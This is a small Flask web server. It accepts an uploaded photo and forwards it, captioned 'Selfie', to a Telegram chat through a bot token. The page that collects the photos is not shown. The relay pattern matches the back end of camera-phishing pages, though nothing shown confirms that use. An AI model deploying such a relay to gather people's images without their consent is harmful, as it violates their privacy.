from flask import Flask, render_template, request, jsonify
import requests
import io
import os

app = Flask(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHAT_ID = os.environ["CHAT_ID"]


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/upload", methods=["POST"])
def upload():
    photo = request.files.get("photo")

    if not photo:
        return jsonify({
            "ok": False,
            "error": "Şəkil göndərilməyib"
        }), 400

    telegram_url = (
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    )

    response = requests.post(
        telegram_url,
        data={
            "chat_id": CHAT_ID,
            "caption": "Selfie 📸"
        },
        files={
            "photo": (
                "selfie.jpg",
                io.BytesIO(photo.read()),
                "image/jpeg"
            )
        },
        timeout=30
    )

    return jsonify({
        "ok": response.ok
    })


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000))
    )
